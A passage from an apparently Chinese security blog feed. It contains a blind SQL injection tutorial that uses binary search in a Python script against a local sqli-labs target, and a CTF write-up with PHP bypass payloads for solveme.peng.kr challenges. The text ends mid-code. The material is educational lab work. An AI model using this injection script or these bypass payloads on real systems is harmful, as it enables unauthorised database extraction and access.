    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在重新复习SQL注入用了sqllabs这个靶场，发现在做盲注的时候自己写的脚本，就一直自增去盲注的话时间花费太大，所以就在看了看二分查找在这一方面的应用<br>确实快了不少，很久没有写过小脚本就手有点生疏了，赶紧记录一下<a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>二分查找又称折半查找，优点是比较次数少，查找速度快，平均性能好；其缺点是要求待查表为有序表，且插入删除困难。因此，折半查找方法适用于不经常变动而查找频繁的有序列表。首先，假设表中元素是按升序排列，将表中间位置记录的关键字与查找关键字比较，如果两者相等，则查找成功；否则利用中间位置记录将表分成前、后两个子表，如果中间位置记录的关键字大于查找关键字，则进一步查找前一子表，否则进一步查找后一子表。重复以上过程，直到找到满足条件的记录，使查找成功，或直到子表不存在为止，此时查找不成功。</p><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p> 最优时间复杂度：O(1)<br> 最坏时间复杂度：O(logn)</p><p><img src="https://s1.ax1x.com/2018/08/27/Pqwqeg.png" alt="Pqwqeg.png"></p><p>可以自行对比一下两组代码的不同<br>这是自增的写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用=去作为判断条件</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">127</span>):</span><br><span class="line">payload = url.format(_ = i,__ = j)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans  = requests.get(payload)</span><br><span class="line"><span class="comment">#print ans.content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line"><span class="comment"># database = database + chr(j)</span></span><br><span class="line"><span class="comment"># print database</span></span><br><span class="line">table_name += chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>下面是使用二分法去搜索，我这里使用非递归的办法去实现二分查找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用&gt;去作为判断条件</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>  i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):  <span class="comment">#这个地方可能会有些问题，数据库长度未知的时候过长会出现重复字母到时候自行删除即可</span></span><br><span class="line">min = <span class="number">65</span></span><br><span class="line">max = <span class="number">122</span></span><br><span class="line"><span class="keyword">while</span> abs(max - min) &gt; <span class="number">1</span>:</span><br><span class="line">mid = (max + min)//<span class="number">2</span></span><br><span class="line">payload = url.format(_=i,__ = mid)</span><br><span class="line">ans = requests.get(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">min = mid</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">max = mid</span><br><span class="line"></span><br><span class="line">database += chr(max)</span><br><span class="line"><span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/08/27/Pq0imF.png" alt="Pq0imF.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在重新复习SQL注入用了sqllabs这个靶场，发现在做盲注的时候自己写的脚本，就一直自增去盲注的话时间花费太大，所以就在看了看二分查找在这一方面的应用&lt;br&gt;确实快了不少，很久没有写过小脚本就手有点生疏了，赶紧记录一下
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="二分查找" scheme="0verwatch.top/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Solve Me解题记录</title>
    <link href="0verwatch.top/2018/08/14/Solve-Me-wp/"/>
    <id>0verwatch.top/2018/08/14/Solve-Me-wp/</id>
    <published>2018-08-14T10:23:48.000Z</published>
    <updated>2018-08-19T14:13:10.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前一阵子关注点在实战上，现在又回归CTF学习套路了，这个网站<a href="http://solveme.peng.kr" target="_blank" rel="noopener">http://solveme.peng.kr</a> 本来做了一半的题目，今天终于把他补完了，学到了炒鸡多的东西啊<a id="more"></a>~</p><p>##正文</p><h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h3><p>给出来一个密文和一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(hex2bin(strrev(bin2hex($flag)))), <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题直接反过来写代码即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$s = <span class="string">'1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(strrev(bin2hex(base64_decode($s))));</span><br></pre></td></tr></table></figure><h3 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'answer'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>($_GET[<span class="string">'answer'</span>] === <span class="string">'尊찢悼嚴隆'</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Wrong answer'</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题可以知道我们要传进get参数，但是<code>===</code>后面的内容不在可见的ASCII码范围内于是我们抓包看一下<br>找到对应字符串的ASCII码，我们知道单引号url编码为%27,两个27之间的就是那串字符串的ASCII码，<br>直接构造<code>payload：?answer=%f0%ee%c2%f5%d3%fa%e5%f1%d7%cc</code>,得到flag</p><h3 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            sleep((int)$_GET[<span class="string">'time'</span>]);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这一个题目我们运用了<code>int的强制转换</code>和<code>科学计数法</code><br>这个题目先使用科学计数法绕过前面的两个<code>time</code>以及<code>is_numeric</code>，最后通过int的阶段获取到flag，因为<code>60 * 60 * 24 * 30 * 2=5.184*10^6</code><br>现在的<code>payload：?time=5.185e6</code>,sleep大约5秒后出现flag<br>为什么出现这样的效果我们来测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> $time = <span class="string">'5.185e6'</span>;</span><br><span class="line"> $num1 = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>;</span><br><span class="line"> $num2 = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>;</span><br><span class="line"> var_dump(!is_numeric($time));</span><br><span class="line"> var_dump($time&gt;$num1);</span><br><span class="line"> var_dump($time&lt;$num2);</span><br><span class="line"> var_dump((int)$time);</span><br><span class="line"></span><br><span class="line">bool(<span class="keyword">false</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">int(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><h3 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h3><p>一开始上手这一个题目，发现什么头绪也没有，因为他的那些参数我一个都不知道，发现url有点奇怪后来就尝试着直接去访问<code>index.php</code>，网页顿了一下又回到了login.php，怀疑存在<code>302跳转</code>，于是抓包看一下，果然重定向到<code>login.php</code><br>但同时我们也得到flag</p><p>还有第二种方法，直接curl一下看情况<br><a href="https://imgchr.com/i/P21ZSH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P21ZSH.md.png" alt="P21ZSH.md.png"></a></p><h3 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">"/lib.php"</span>;</span><br><span class="line"></span><br><span class="line">   $url = urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">   $url_query = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">   $params = explode(<span class="string">"&amp;"</span>, $url_query);</span><br><span class="line">   <span class="keyword">foreach</span>($params <span class="keyword">as</span> $param)&#123;</span><br><span class="line"></span><br><span class="line">       $idx_equal = strpos($param, <span class="string">"="</span>);</span><br><span class="line">       <span class="keyword">if</span>($idx_equal === <span class="keyword">false</span>)&#123;</span><br><span class="line">           $key = $param;</span><br><span class="line">           $value = <span class="string">""</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           $key = substr($param, <span class="number">0</span>, $idx_equal);</span><br><span class="line">           $value = substr($param, $idx_equal + <span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do_you_want_flag'</span>]) &amp;&amp; $_GET[<span class="string">'do_you_want_flag'</span>] == <span class="string">"yes"</span>)&#123;</span><br><span class="line">       <span class="keyword">die</span>($flag);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这一个题目我们可以发现存在parse_url函数，这个函数有个漏洞可以用多个/符号去绕过，然后就不会执行<code>die(&quot;no hack&quot;)</code>;转而执行了下面的语句。<br>这里有篇方方土学长写过的总结:<a href="http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">点我</a><br>构造的<code>payload：///?do_you_want_flag=yes</code><br>后来发现还有官方的解法，就是利用描点去绕过，从来都不知道还可以这样搞<br><code>http://urlfiltering.solveme.peng.kr/?%23&amp;do_you_want_flag=yes</code></p><p>#Hash collision</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'foo'</span>], $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strlen($_GET[<span class="string">'foo'</span>]) &gt; <span class="number">30</span> || strlen($_GET[<span class="string">'bar'</span>]) &gt; <span class="number">30</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'foo'</span>] === $_GET[<span class="string">'bar'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Same value'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'foo'</span>]) !== hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Different hash'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这种题目做了很多遍了，就是利用数组返回NULL去绕过，构造下面的payload</p><p><code>?foo[]=1&amp;bar[]=2</code></p><h3 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    $value = $_GET[<span class="string">'value'</span>];</span><br><span class="line"></span><br><span class="line">    $username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>]) <span class="keyword">unset</span>($username);</span><br><span class="line">        <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">        <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($username == <span class="string">'15th_HackingCamp'</span> &amp;&amp; md5($password) == md5(file_get_contents(<span class="string">'./secret.passwd'</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">            <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>发现要跟<code>./secret.passwd</code>路径下的内容一样，先去里面看一下，发现字符串<code>simple_passw0rd</code><br>这个题目get到了一个新的知识点</p><p>就是chr()这个函数再ASCII码超过255的时候会自动取余，我们利用这个特性去拼接username的字符串，于是写了个Python脚本构造payload: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">'''15th_HackingCamp'''</span></span><br><span class="line">dit = []</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">dit.append((ord(i)+<span class="number">256</span>))</span><br><span class="line"><span class="comment">#print dit </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dit:</span><br><span class="line">payload += (<span class="string">'value[]='</span>+str(j)+<span class="string">'&amp;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload+<span class="string">'password=simple_passw0rd'</span></span><br></pre></td></tr></table></figure><p>得到payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</span><br></pre></td></tr></table></figure><p>最后得到flag</p><h3 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'say'</span>]) &amp;&amp; strlen($_GET[<span class="string">'say'</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">        $say = preg_replace(<span class="string">'/^(.*)flag(.*)$/'</span>, <span class="string">'$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;'</span>, $_GET[<span class="string">'say'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/give_me_the_flag/'</span>, $say))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'What the f**k?'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题题目漏洞出现在正则匹配那里<br>根据我们查到的资料，因为以’^’开头，以’$’结尾的只能匹配一行，也就是说我们可以用<code>%0a</code>/url编码下的换行/去绕过<br>于是我们可以构造payload:?say=<code>%0Agive_me_the_flag</code><br>得到flag</p><h3 id="Give-me-a-link-2"><a href="#Give-me-a-link-2" class="headerlink" title="Give me a link 2"></a>Give me a link 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?$/i'</span>, $parse[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed scheme'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i'</span>, $parse[<span class="string">'host'</span>]))&#123;</span><br><span class="line">            <span 